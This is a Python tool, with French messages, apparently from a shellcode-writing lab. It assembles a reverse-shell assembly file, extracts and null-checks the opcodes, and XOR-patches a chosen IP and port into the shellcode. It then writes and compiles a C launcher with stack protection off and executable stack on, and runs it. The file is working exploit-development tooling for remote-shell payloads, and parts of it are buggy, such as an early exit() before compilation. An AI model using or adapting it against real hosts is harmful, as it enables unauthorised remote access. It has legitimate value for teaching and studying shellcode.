import subprocess
import re  # https://regex101.com/
import os
import sys
import socket


def lancementCodeC(verbose, programmeC_Name, programmeC_Path):
    print("<---------- Compilation et lancement de " +
          programmeC_Path+programmeC_Name+".c ---------->")

    if(verbose):
        print("Lancement de la commande gcc -o "+programmeC_Path+programmeC_Name+".out " +
              programmeC_Path+programmeC_Name+".c -z execstack -m32 -fno-stack-protector")
    os.system("gcc -o "+programmeC_Path+programmeC_Name+".out "+programmeC_Path +
              programmeC_Name+".c -z execstack -m32 -fno-stack-protector")
    if(verbose):
        print("Lancement de l'executable "+programmeC_Path+programmeC_Name)
    os.system(programmeC_Path+programmeC_Name+".out")


def createFileC(verbose, programmeC_Name, programmeC_Path, shellcode):
    print("<---------- Création du fichier " +
          programmeC_Path+programmeC_Name+".c ---------->")

    with open(programmeC_Path+programmeC_Name+".c", "w") as file:
        file.write('#include <stdio.h>\n#include <string.h>\n\n')
        file.write('int main(void)\n{\n')
        file.write('\tunsigned char code[] = \\\n')
        file.write('\t\"'+shellcode+'\" ;\n')
        file.write('\tprintf("Shellcode length: %d\\n", strlen(code)); \n')
        file.write('\tvoid (*s)() = (void *)code;\n\ts();\n')
        file.write('\treturn 0;\n}')
    if(verbose == 3):
        print("création du fichier C :")
        print('#include <stdio.h>\n#include <string.h>\n')
        print('int main(void)\n{')
        print('\tunsigned char code[] = \\')
        print('\t\"'+shellcode+'\" ;')
        print('\tprintf("Shellcode length: %d\\n", strlen(code)); ')
        print('\tvoid (*s)() = (void *)code;\n\ts();')
        print('\treturn 0;\n}')


def portInsert(code, port):
    code = code.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{b1}\\x{b2}".format(
        b1=port[4:6],
        b2=port[2:4]
    ))
    return code


def ipInsert(ip, code, xor_byte):
    # Inject the IP address
    ip_bytes = []
    for i in range(0, 4):
        ip_bytes.append(hex(ip[i] ^ xor_byte))
    array_hex_ip = []
    for i in range(0, 4):
        if(len(ip_bytes[i][2:]) == 1):
            hex_ip_bytes = ip_bytes[i][1:2]+"0"+ip_bytes[i][2]
            array_hex_ip.append(hex_ip_bytes)
        else:
            array_hex_ip.append(ip_bytes[i][1:])
    code = code.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\{b1}\\{b2}\\{b3}\\{b4}".format(
        b1=array_hex_ip[0],
        b2=array_hex_ip[1],
        b3=array_hex_ip[2],
        b4=array_hex_ip[3]
    ))
    return code


def xorFinder(ip):
    xor_byte = 0
    for i in range(1, 256):
        matched_a_byte = False
        #print(" ------------- i  :"+str(i))
        for octet in ip:
            #print(str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
            if i == octet:
                #print("dans if : "+str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
                matched_a_byte = True
                break

        if not matched_a_byte:
            #print("dans if : "+str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
            xor_byte = i
            break

    # print(xor_byte)
    if xor_byte == 0:
        print("Failed to find a valid XOR byte")
        exit(1)
    return xor_byte


def xorInsert(ip, code, port):
    xor_byte = xorFinder(ip)
    # Inject the XOR bytes
    if(len(hex(xor_byte)[2:]) == 1):
        hex_xor_byte = hex(xor_byte)[1:2]+"0"+hex(xor_byte)[2]
        code = code.replace("\\xb8\\xff\\xff\\xff\\xff",
                            "\\xb8\{x}\{x}\{x}\{x}".format(x=hex_xor_byte))
    else:
        code = code.replace("\\xb8\\xff\\xff\\xff\\xff",
                            "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x=hex(xor_byte)[1:3]))
        print("xor_byte : "+xor_byte)
        print("hex(xor_byte)[1:3] : "+hex(xor_byte)[1:3])

    code = ipInsert(ip, code, xor_byte)
    return portInsert(code, port)


def CheckNullBytes(verbose, shellcode, nbrLine):
    for i in range(0, len(shellcode), 2):
        if shellcode[i:i+2] == "00":
            print("Il y a un ou plusieurs NullBytes à la " +
                  str(nbrLine)+"ieme ligne de l'opcode : " + shellcode)
            return 1
    return 0


def objdump(verbose,  programme_Path, programme_Name):
    print("<---------- Lancement de ObjDump en cours ---------->")
    os.system("nasm -f elf "+programme_Path+programme_Name+".asm  && ld " +
              programme_Path+programme_Name+".o -m elf_i386 -o "+programme_Path+programme_Name)
    if(verbose):
        print("Lancement de la commande objdump -d " +
              programme_Path+programme_Name)
    objdump = subprocess.run(
        'objdump -d '+programme_Path+programme_Name, shell=True, stdout=subprocess.PIPE)
    objdump = objdump.stdout.decode("utf-8")
    if(verbose == 3):
        print("Resultat de OBJDUMP :"+objdump)
    objdump = objdump.replace("\t", "")
    result = re.findall(":[0-9a-f ]{21}", objdump)
    return result


def cleanOpCode(verbose, programme_Path, programme_Name):
    resultfinal = []
    nbrLine = 0
    nullByte = 0

    for res in objdump(verbose, programme_Path, programme_Name):
        nullByte += CheckNullBytes(verbose, res, nbrLine)
        resultfinal.append(res[1:].replace(" ", ""))
        nbrLine += 1

    print("<---------- Check des NUllsBytes en cours ---------->")
    if nullByte > 0:
        print("Des NullBytes ont été détécté.")
    elif(verbose):
        print("Aucun NullBytes dans ce shellcode ! ")

    print("<---------- Nettoyage de l'opcode en cours ---------->")
    resultfinal = "".join(resultfinal)

    if(verbose):
        print("Opcode nettoyé : "+resultfinal)
    return resultfinal


def shellcodeCreation(verbose, programme_Name, programme_Path):
    resultfinal = cleanOpCode(verbose, programme_Path, programme_Name)
    print("<---------- Génération de l'exploit en cours ---------->")
    exploit = ""
    #exploit = []
    # exploit.append("")
    # exploit.append("")
    for i in range(0, len(resultfinal), 2):
        exploit += "\\x"+resultfinal[i:i+2]
        #exploit[0] += "\\x"+resultfinal[i:i+2]
        #exploit[1] += "\\\\x"+resultfinal[i:i+2]
    print("Shellcode : ")
    print(exploit)
    # print(exploit[0])
    #print("Shellcode : ")
    # print(exploit[1])
    if(verbose):
        print("Taille de l'exploit : "+str(int(len(resultfinal)/2)))
    return exploit


def all(verbose, programmeC_Name, programmeC_Path, port, ip):
    shellcode = shellcodeCreation(verbose, programmeC_Name, programmeC_Path)
    programmeC_Path = programmeC_Path.split("asm")
    programmeC_Path = programmeC_Path[0]+"c"+programmeC_Path[1]
    modifiedShellcode = 0
    if(port):
        modifiedShellcode = 1
    else:
        port = "0xb315"  # 4444
    if(ip):
        modifiedShellcode = 1
    else:
        ip = "\x7f\x00\x00\x01"

    if(modifiedShellcode):
        print("port : ")
        print(port)
        print("ip : ")
        print(ip)
        modifiedShellcode = xorInsert(ip, shellcode, port)
    print(modifiedShellcode)
    exit()
    print(modifiedShellcode)
    createFileC(verbose, programmeC_Name, programmeC_Path, modifiedShellcode)
    #createFileC(verbose, programmeC_Name, programmeC_Path, shellcode[0])
    lancementCodeC(verbose, programmeC_Name, programmeC_Path)


def verifIfExploitIsSet(programmeC_Name, programmeC_Path):
    result = input("Avez vous pensé à changer la variable 'shellcode' de " +
                   programmeC_Path+programmeC_Name+".c ([y/yes/o/oui]/[n/no/non]) :  ")
    result = result.lower()
    if(result == "y" or result == "yes" or result == "o" or result == "oui" or result == ""):
        print("Très bien, continuons !")
    elif(result == "n" or result == "no" or result == "non"):
        print("Allez le modifier !")
        exit()
    else:
        print("Merci de répondre y/yes/o/oui ou n/no/non merci !")
        exit()


def recupIp(verbose, ip):
    print("<---------- Récupération de l'ip ---------->")
    validIp = 0
    if(not ip or ip.find("-") == 0):
        ip = input(
            "Ip par défaut : 127.0.0.1 . Veuillez entrer une ip valide (exemple 127.0.0.1):")
    while validIp == 0:
        ip = ip.split(".")
        if(len(ip) == 4):
            for eachIp in ip:
                if(eachIp != "" and 0 <= int(eachIp) < 255):
                    validIp = 1
                else:
                    print("Problème d'ip (valeur pas comprise entre 0 et 255)")
                    validIp = 0
                    break
        else:
            validIp = 0
            print("Problème d'ip (il y a trop ou pas assez de . )")
        if(validIp == 0):
            ip = input("Ip actuelle : "+".".join(ip) +
                       " Veuillez entrer une IP valide (exemple 127.0.0.1):")
    ip = (".".join(ip))
    if(verbose):
        print("L'ip selectionné est : "+ip +
              " soit : "+str(socket.inet_aton(ip)))
    ip = socket.inet_aton(ip)
    return ip


def recupPort(verbose, port):
    print("<---------- Récupération du port ---------->")
    validPort = 0
    if(not port or port.find("-") == 0):
        port = input(
            "Port par défaut : 4444 . Veuillez entrer un port valide (de 1024 à 65353):")
    while validPort == 0:
        if(port != "" and 1024 <= int(port) < 65353):
            validPort = 1
        else:
            print("Problème de port")
            port = input("Port actuel : "+port +
                         " Veuillez entrer un port valide (de 1024 à 65353):")
    if(verbose):
        print("Le port selectionné est : "+port +
              " soit : "+str(hex(socket.htons(int(port)))))
    port = hex(socket.htons(int(port)))
    return port


def nameCleaner(verbose, fileName):
    print("<---------- Creation des noms de fichiers ---------->")
    programmeName = fileName.split("/")
    programmePath = ""
    arrayName = []
    for i in range(0, len(programmeName)-1):
        programmePath += programmeName[i]+"/"
    programmeName = programmeName[len(programmeName)-1]
    programmeName = programmeName.split(".asm")
    programmeName = programmeName[0].split(".c")
    programmeName = programmeName[0]
    if(verbose):
        print("Nom du programme : "+programmeName)
        print("Nom de la route : "+programmePath)
    arrayName.append(programmeName)
    arrayName.append(programmePath)
    return arrayName


def recupArgument(verbose, fileName):
    print("<---------- Récupération du nom du fichier en cours ---------->")
    file_test = subprocess.run(
        "ls "+fileName, shell=True, stdout=subprocess.PIPE)
    exist = 0
    name = ""
    if(file_test.returncode != 0 or fileName == "" or fileName.find("-") == 0):
        while exist == 0:
            os.system(
                "echo Vous êtes actuellement ici : $(pwd), dans votre dossier il y a : $(ls)")
            name = input("Entrez le nom du fichier :")
            file_test = subprocess.run(
                "ls "+name, shell=True, stdout=subprocess.PIPE)
            if(file_test.returncode != 0 or name == "" or name.find("-") == 0):
                print("Le fichier "+name+" n'existe pas !")
            else:
                exist = 1
    else:
        if(verbose):
            print("Nom du fichier complète : "+fileName)
        return fileName
    if(verbose):
        print("Nom du fichier complète  : "+name)
    return name


def exemple():
    print("<---------------------------------------- EXEMPLES ---------------------------------------->")
    print("Exemple : python "+sys.argv[0] +
          " -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Retourne le shellcode     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c ../final/c/fnl_reverse_shell.c " +
          "\n//     Compile et lance le programme     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Compile et lance le programme avec le shellcode du fichier.asm     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -p 4444 -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Retourne le shellcode du fichier en changeant le port     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -i 127.0.0.1 -s ../final/asm/fnl_reverse_shell.asm " +
          "\n//     Retourne le shellcode du fichier en changeant l'ip     \\\\")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm -i 127.0.0.1 -p 4444 " +
          "\n//     Compile et lance le programme avec le shellcode du fichier.asm en changeant l'ip et le port     \\\\")
    print("<---------------------------------------- EXEMPLES ---------------------------------------->")


def help():
    print("<------------------------------------------ HELP ------------------------------------------>")
    print("-h Affiche ce message")
    print("-e Affiche des exemples de commandes")
    print("-v Active le mode verbosité")
    print("-vvv Active le mode haute verbosité (objdump)")
    print("-s Création de lu shellcode")
    print("-c compile un fichier.c et le lance")
    print("-i Changement de l'ip dans le shellCode")
    print("-p Changement du port dans le shellCode")
    print("<------------------------------------------ HELP ------------------------------------------>")
    exit()


def menu():
    array = [0, 0, 0, 0, "", 0, "", 0, ""]
    for i in range(0, len(sys.argv)):
        if str(sys.argv[i]) == "-h":
            array[0] = 1
        if str(sys.argv[i]) == "-e":
            array[0] = 2
        elif str(sys.argv[i]) == "-v":
            array[3] = 1
        elif str(sys.argv[i]) == "-vvv":
            array[3] = 3
        elif str(sys.argv[i]) == "-p":
            array[5] = 1
            if(len(sys.argv) > i+1):
                array[6] = sys.argv[i+1]
        elif str(sys.argv[i]) == "-i":
            array[7] = 1
            if(len(sys.argv) > i+1):
                array[8] = sys.argv[i+1]
        elif str(sys.argv[i]) == "-s":
            array[1] = 1
            if(len(sys.argv) > i+1):
                array[4] = sys.argv[i+1]
        elif str(sys.argv[i]) == "-c":
            array[2] = 1
            if(len(sys.argv) > i+1):
                array[4] = sys.argv[i+1]
    return array


def main():
    menuResult = menu()
    port = ""
    ip = ""
    if(menuResult[3] == 3):
        print("Tableau des choix utilisateurs : "+menuResult)
    if menuResult[0] == 1 or len(sys.argv) == 1:
        help()
    elif menuResult[0] == 2 or (menuResult[1] == 0 & menuResult[2]):
        exemple()
    else:
        fileName = recupArgument(menuResult[3], menuResult[4])
        arrayName = nameCleaner(menuResult[3], fileName)
        if(menuResult[5]):
            port = recupPort(menuResult[3], menuResult[6])
        if(menuResult[7]):
            ip = recupIp(menuResult[3], menuResult[8])
        if menuResult[1] == 1 and menuResult[2] == 1:
            all(menuResult[3], arrayName[0], arrayName[1], port, ip)
        elif menuResult[1] == 1:
            shellcodeCreation(menuResult[3], arrayName[0], arrayName[1])
        elif menuResult[2] == 1:
            verifIfExploitIsSet(arrayName[0], arrayName[1])
            lancementCodeC(menuResult[3], arrayName[0], arrayName[1])
            exit()
        else:
            help()


if __name__ == "__main__":
    main()
